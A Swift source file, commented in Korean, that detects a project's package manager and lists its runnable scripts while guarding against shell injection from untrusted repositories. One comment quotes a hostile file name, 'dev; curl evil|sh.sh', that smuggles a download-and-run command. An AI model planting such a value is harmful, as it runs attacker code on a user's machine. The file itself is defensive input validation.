import Foundation

/// 패키지 매니저 — **추측하지 않는다. lock 파일이 진실이다.**
///
/// pnpm 프로젝트에 `npm run`을 넣으면 lock이 깨지거나 엉뚱한 의존성이 깔린다.
/// lock 파일이 없으면 `nil`이고, 그때는 사용자가 직접 고른다(지어내지 않는다).
enum PackageManager: String, CaseIterable, Identifiable {
    case pnpm, yarn, bun, npm

    var id: String { rawValue }

    private var lockfiles: [String] {
        switch self {
        case .pnpm: return ["pnpm-lock.yaml"]
        case .yarn: return ["yarn.lock"]
        case .bun: return ["bun.lockb", "bun.lock"]
        case .npm: return ["package-lock.json"]
        }
    }

    /// 탐지 **우선순위** — 여러 lock이 공존할 때 어느 게 이기나. **UI 순서(`allCases`)와 분리**한다.
    ///
    /// 규칙: **자기 전용(오해 불가능한) 신호부터.** `bun.lock`/`bun.lockb`는 `bun install`만 만든다.
    /// 반면 `yarn.lock`은 과거 yarn 흔적이나 bun 호환 출력으로 **남아 있을 수 있어** 약한 신호다 —
    /// 그래서 **bun이 yarn을 이긴다**. (aha-db-wiki: bun.lock 39KB 최신 + yarn.lock 1.5KB 구잔재 → bun이 맞다.)
    /// `packageManager` 필드는 낡을 수 있어(같은 레포가 산증인) 신뢰하지 않는다 — lock이 진실이다.
    private static let detectPriority: [PackageManager] = [.pnpm, .bun, .yarn, .npm]

    static func detect(files: [String]) -> PackageManager? {
        let names = Set(files)
        return detectPriority.first { pm in pm.lockfiles.contains { names.contains($0) } }
    }

    func runCommand(_ script: String) -> String {
        "\(rawValue) run \(script)"
    }
}

/// 스크립트가 어디서 왔나 — 목록에서 출처를 밝혀 "이게 왜 여기 있지"를 없앤다.
/// **파서가 있는 출처만 둔다** — 라벨만 있고 탐지가 없으면 "지원되나 보다"라는 거짓 신호가 된다
/// (justfile이 그랬다). 되살릴 땐 파서·discover 분기와 함께.
enum ScriptSource: String {
    case packageJSON = "package.json"
    case makefile = "Makefile"
    case shell = "scripts/"
}

/// 프로젝트에서 실행할 만한 스크립트 하나.
struct ProjectScript: Identifiable, Equatable {
    var id: String { "\(source.rawValue)/\(name)" }
    let name: String // "dev"
    /// 실행할 명령. package.json은 조립하고(`pnpm run dev`), 나머지는 그 자체(`make dev`).
    let body: String
    /// 사람이 붙인 설명(있으면). 각 생태계의 주석 관례에서 읽는다.
    let note: String?
    let source: ScriptSource
}

/// 프로젝트 스크립트 탐지 — 순수 파싱은 여기, 파일 읽기(부작용)는 `discover`에만.
enum ProjectScripts {
    // MARK: 신뢰 경계 — package.json·Makefile·scripts/ 는 **리포가 주는 값**이다(적대적일 수 있다)

    /// 스크립트 이름으로 인정할 문자 — `^[A-Za-z0-9._:-]+$` (`build:prod`·`test.e2e`·`dev-server`).
    ///
    /// 이름은 그대로 실행 명령이 된다(`pnpm run <이름>`). 공백·따옴표·`;`·`$`가 든 이름을 받아들이면
    /// 그 명령이 로그인 셸을 거칠 때 **한 줄이 여러 명령으로 쪼개진다.** 여기서 이름 자체를 좁힌다.
    static func isValidName(_ name: String) -> Bool {
        !name.isEmpty && name.allSatisfy {
            $0.isASCII && ($0.isLetter || $0.isNumber || $0 == "." || $0 == "_" || $0 == ":" || $0 == "-")
        }
    }

    /// 화면에 그릴 문자열에서 **제어문자·개행을 걷어낸다.**
    ///
    /// 개행이 남으면 한 줄짜리 미리보기가 뒷부분(진짜 실행될 payload)을 화면 밖으로 접어버리고,
    /// note가 명령인 척 위장할 수 있다. 이름·설명·명령 미리보기가 모두 이걸 통과한다.
    static func sanitize(_ text: String) -> String {
        String(text.unicodeScalars.filter { !CharacterSet.controlCharacters.contains($0) })
            .trimmingCharacters(in: .whitespaces)
    }

    /// 스크립트가 실제로 실행할 명령 — **정책은 여기 있다(뷰가 아니라).**
    /// package.json만 패키지 매니저로 조립하고(`pnpm run dev`), Makefile·셸 스크립트는
    /// 이미 완성된 명령이다(`make dev`·`./scripts/dev.sh`).
    static func command(for script: ProjectScript, manager: PackageManager) -> String {
        script.source == .packageJSON ? manager.runCommand(script.name) : script.body
    }

    /// package.json 문자열 → 스크립트 목록. 깨진 JSON이면 빈 배열(죽지 않고, 지어내지도 않는다).
    ///
    /// **설명(주석)** — package.json은 JSON이라 진짜 주석이 없다. 실제로 쓰이는 두 관례를 읽는다:
    ///  1. `"scripts-info": { "dev": "..." }` — npm-scripts-info 관례. 설명하려고 만든 필드라 **우선한다**.
    ///  2. `"scripts": { "//dev": "...", "dev": "vite" }` — npm이 `//` 키를 무시하는 성질을 쓴 주석
    ///     (`"// dev"`처럼 공백을 넣기도 한다). 주석 키 자체는 목록에 넣지 않는다.
    static func parsePackageScripts(_ json: String) -> [ProjectScript] {
        guard let data = json.data(using: .utf8),
              let root = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
              let scripts = root["scripts"] as? [String: Any] else { return [] }

        let info = root["scripts-info"] as? [String: String] ?? [:]

        // `//dev` · `// dev` → dev 의 설명
        var comments: [String: String] = [:]
        for (key, value) in scripts {
            guard key.hasPrefix("//"), let text = value as? String else { continue }
            let target = key.dropFirst(2).trimmingCharacters(in: .whitespaces)
            guard !target.isEmpty else { continue } // 단독 "//"는 어느 스크립트의 설명인지 알 수 없다
            comments[target] = text
        }

        return scripts.compactMap { name, value -> ProjectScript? in
            // 이름이 규약을 벗어나면 **버린다** — 이름이 곧 실행 명령이 된다(`pnpm run <이름>`).
            guard !name.hasPrefix("//"), isValidName(name), let body = value as? String else { return nil }
            let note = (info[name] ?? comments[name]).map(sanitize)
            return ProjectScript(name: name, body: sanitize(body),
                                 note: note?.isEmpty == false ? note : nil, source: .packageJSON)
        }
        // JSON 딕셔너리는 순서가 없다 — 목록이 매번 뒤바뀌지 않도록 이름순으로 고정한다.
        .sorted { $0.name < $1.name }
    }

    /// Makefile → 타깃 목록. package.json이 없는 생태계(Go·Rust·C)의 사실상 표준이다.
    ///
    /// 설명은 **self-documenting makefile 관례**(`dev: ## 개발 서버`)에서 읽는다.
    /// `.PHONY`·변수 대입(`CC = gcc`)·패턴 규칙(`%.o: %.c`)은 타깃이 아니라 걸러낸다.
    static func parseMakefile(_ text: String) -> [ProjectScript] {
        var targets: [ProjectScript] = []
        for line in text.split(separator: "\n", omittingEmptySubsequences: true) {
            let raw = String(line)
            // 들여쓴 줄은 레시피(명령)지 타깃이 아니다.
            guard !raw.hasPrefix("\t"), !raw.hasPrefix(" "), !raw.hasPrefix("#") else { continue }
            guard let colon = raw.firstIndex(of: ":") else { continue }

            let name = String(raw[raw.startIndex..<colon]).trimmingCharacters(in: .whitespaces)
            // 타깃 이름 규칙 — 특수 타깃(.PHONY)·패턴(%)·변수 대입(CC = gcc, X := y)을 배제한다.
            // 이름은 `make <이름>`으로 조립돼 셸을 타므로 package.json과 **같은 화이트리스트**를 통과해야 한다.
            guard !name.hasPrefix("."), isValidName(name) else { continue }
            // 변수 대입은 타깃이 아니다 — `X := y`뿐 아니라 `X ::= y`(POSIX 즉시 대입)도 걸러야 한다.
            // 콜론을 더 걷어낸 뒤 `=`면 대입이다. `foo:: bar`(이중 콜론 **규칙**)는 진짜 타깃이라
            // 남는다 — 콜론만 보고 자르면 그것까지 함께 잃는다.
            let after = raw[raw.index(after: colon)...]
            guard !after.drop(while: { $0 == ":" }).hasPrefix("=") else { continue }

            let note = after.range(of: "##").map {
                sanitize(String(after[$0.upperBound...]))
            }
            targets.append(ProjectScript(name: name, body: "make \(name)",
                                         note: note?.isEmpty == false ? note : nil, source: .makefile))
        }
        return targets.sorted { $0.name < $1.name }
    }

    /// 셸 스크립트의 설명 — **shebang 바로 뒤의 주석**만 본다.
    /// 코드가 시작된 뒤의 `#`는 내부 로직 주석이지 스크립트 설명이 아니다.
    static func shellScriptNote(_ text: String) -> String? {
        for line in text.split(separator: "\n", omittingEmptySubsequences: false) {
            let t = line.trimmingCharacters(in: .whitespaces)
            if t.isEmpty || t.hasPrefix("#!") { continue }
            guard t.hasPrefix("#") else { return nil } // 코드가 시작됐다 — 설명 없음
            let note = sanitize(String(t.dropFirst()))
            return note.isEmpty ? nil : note
        }
        return nil
    }

    // MARK: 경계 — 디렉터리를 읽는다

    /// 디렉터리를 훑어 실행할 만한 스크립트와 패키지 매니저를 찾는다(파일 IO).
    /// 아무것도 없으면 빈 목록이고, UI는 "직접 입력"만 보여준다(muxa 같은 네이티브 앱 프로젝트가 그렇다).
    static func discover(in dir: String?) -> (scripts: [ProjectScript], manager: PackageManager?) {
        guard let dir,
              let files = try? FileManager.default.contentsOfDirectory(atPath: dir) else { return ([], nil) }
        let manager = PackageManager.detect(files: files)
        var found: [ProjectScript] = []

        if files.contains("package.json"), let json = read(dir, "package.json") {
            found += parsePackageScripts(json)
        }
        for name in ["Makefile", "makefile", "GNUmakefile"] where files.contains(name) {
            if let text = read(dir, name) { found += parseMakefile(text) }
            break // 하나만(make가 찾는 순서와 같다)
        }
        found += shellScripts(in: dir)
        return (found, manager)
    }

    /// `scripts/`의 실행 가능한 셸 스크립트 — Makefile도 package.json도 없는 리포에서 흔한 형태.
    private static func shellScripts(in dir: String) -> [ProjectScript] {
        let scriptsDir = (dir as NSString).appendingPathComponent("scripts")
        guard let names = try? FileManager.default.contentsOfDirectory(atPath: scriptsDir) else { return [] }
        return names.filter { $0.hasSuffix(".sh") }.sorted().compactMap { file in
            let name = (file as NSString).deletingPathExtension
            // 파일명도 그대로 명령이 된다(`./scripts/<파일>`) — 이름·타깃과 같은 화이트리스트를 통과해야 한다.
            // (`dev; curl evil|sh.sh` 같은 파일명은 적대적 리포가 심을 수 있다.)
            guard isValidName(name) else { return nil }
            let path = (scriptsDir as NSString).appendingPathComponent(file)
            guard FileManager.default.isExecutableFile(atPath: path) else { return nil }
            let note = (try? String(contentsOfFile: path, encoding: .utf8)).flatMap(shellScriptNote)
            return ProjectScript(name: name, body: "./scripts/\(file)", note: note, source: .shell)
        }
    }

    private static func read(_ dir: String, _ file: String) -> String? {
        try? String(contentsOfFile: (dir as NSString).appendingPathComponent(file), encoding: .utf8)
    }
}
